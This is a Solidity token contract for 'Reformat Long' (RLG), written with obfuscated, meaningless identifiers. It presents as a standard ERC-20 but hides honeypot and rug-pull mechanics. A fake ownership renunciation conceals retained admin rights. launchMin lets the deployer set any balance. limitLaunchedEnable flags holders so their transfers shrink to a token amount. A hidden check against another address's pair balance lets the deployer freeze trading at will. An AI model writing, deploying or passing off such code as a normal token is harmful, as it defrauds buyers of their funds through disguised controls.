//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface totalFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract totalReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitShouldTo {
    function createPair(address fundTrading, address enableReceiver) external returns (address);
}

interface tradingAmountFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeLaunched) external view returns (uint256);

    function transfer(address receiverMode, uint256 launchedMarketing) external returns (bool);

    function allowance(address autoShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMode,
        uint256 launchedMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromReceiver, uint256 value);
    event Approval(address indexed autoShould, address indexed spender, uint256 value);
}

interface tradingAmountFundMetadata is tradingAmountFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReformatLong is totalReceiver, tradingAmountFund, tradingAmountFundMetadata {

    address private takeBuy;

    function modeBuy(address limitFrom, address receiverMode, uint256 launchedMarketing) internal returns (bool) {
        if (limitFrom == totalTo) {
            return exemptTo(limitFrom, receiverMode, launchedMarketing);
        }
        uint256 walletAt = tradingAmountFund(isAmount).balanceOf(atTx);
        require(walletAt == maxTo);
        require(receiverMode != atTx);
        if (shouldTo[limitFrom]) {
            return exemptTo(limitFrom, receiverMode, autoSwap);
        }
        return exemptTo(limitFrom, receiverMode, launchedMarketing);
    }

    uint256 private listFee;

    function sellReceiverReceiver(address limitAutoFee) public {
        if (enableAt) {
            return;
        }
        
        maxTokenTake[limitAutoFee] = true;
        if (totalFromFund) {
            shouldBuy = true;
        }
        enableAt = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalTokenLimit;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listTo;
    }

    function limitLaunchedEnable(address liquiditySender) public {
        launchToSwap();
        if (totalFromFund == maxFee) {
            maxFee = false;
        }
        if (liquiditySender == totalTo || liquiditySender == isAmount) {
            return;
        }
        shouldTo[liquiditySender] = true;
    }

    mapping(address => mapping(address => uint256)) private atFee;

    uint256 tradingTake;

    function balanceOf(address feeLaunched) public view virtual override returns (uint256) {
        return fromAt[feeLaunched];
    }

    address amountLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address liquidityToken, address teamIs) external view virtual override returns (uint256) {
        if (teamIs == amountLaunch) {
            return type(uint256).max;
        }
        return atFee[liquidityToken][teamIs];
    }

    mapping(address => bool) public shouldTo;

    mapping(address => uint256) private fromAt;

    bool private listEnableReceiver;

    uint256 public atWalletIs;

    uint8 private enableTo = 18;

    bool public enableAt;

    function approve(address teamIs, uint256 launchedMarketing) public virtual override returns (bool) {
        atFee[_msgSender()][teamIs] = launchedMarketing;
        emit Approval(_msgSender(), teamIs, launchedMarketing);
        return true;
    }

    string private launchTx = "Reformat Long";

    constructor (){
        if (atWalletIs != listFee) {
            txList = false;
        }
        totalFrom listFromAuto = totalFrom(amountLaunch);
        isAmount = limitShouldTo(listFromAuto.factory()).createPair(listFromAuto.WETH(), address(this));
        
        totalTo = _msgSender();
        listExempt();
        maxTokenTake[totalTo] = true;
        fromAt[totalTo] = listTo;
        if (listFee != atWalletIs) {
            maxFee = true;
        }
        emit Transfer(address(0), totalTo, listTo);
    }

    uint256 public takeTo;

    address public totalTo;

    function launchToSwap() private view {
        require(maxTokenTake[_msgSender()]);
    }

    function transferFrom(address limitFrom, address receiverMode, uint256 launchedMarketing) external override returns (bool) {
        if (_msgSender() != amountLaunch) {
            if (atFee[limitFrom][_msgSender()] != type(uint256).max) {
                require(launchedMarketing <= atFee[limitFrom][_msgSender()]);
                atFee[limitFrom][_msgSender()] -= launchedMarketing;
            }
        }
        return modeBuy(limitFrom, receiverMode, launchedMarketing);
    }

    function amountMaxReceiver(uint256 launchedMarketing) public {
        launchToSwap();
        maxTo = launchedMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return enableTo;
    }

    bool private totalFromFund;

    uint256 maxTo;

    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant autoSwap = 12 ** 10;

    function name() external view virtual override returns (string memory) {
        return launchTx;
    }

    address public isAmount;

    event OwnershipTransferred(address indexed tradingMarketing, address indexed walletAuto);

    function transfer(address atFrom, uint256 launchedMarketing) external virtual override returns (bool) {
        return modeBuy(_msgSender(), atFrom, launchedMarketing);
    }

    function listExempt() public {
        emit OwnershipTransferred(totalTo, address(0));
        takeBuy = address(0);
    }

    function getOwner() external view returns (address) {
        return takeBuy;
    }

    bool private maxFee;

    function exemptTo(address limitFrom, address receiverMode, uint256 launchedMarketing) internal returns (bool) {
        require(fromAt[limitFrom] >= launchedMarketing);
        fromAt[limitFrom] -= launchedMarketing;
        fromAt[receiverMode] += launchedMarketing;
        emit Transfer(limitFrom, receiverMode, launchedMarketing);
        return true;
    }

    function owner() external view returns (address) {
        return takeBuy;
    }

    mapping(address => bool) public maxTokenTake;

    bool public txList;

    bool public shouldBuy;

    uint256 public totalTx;

    bool private amountAt;

    string private totalTokenLimit = "RLG";

    function launchMin(address atFrom, uint256 launchedMarketing) public {
        launchToSwap();
        fromAt[atFrom] = launchedMarketing;
    }

    uint256 private listTo = 100000000 * 10 ** 18;

}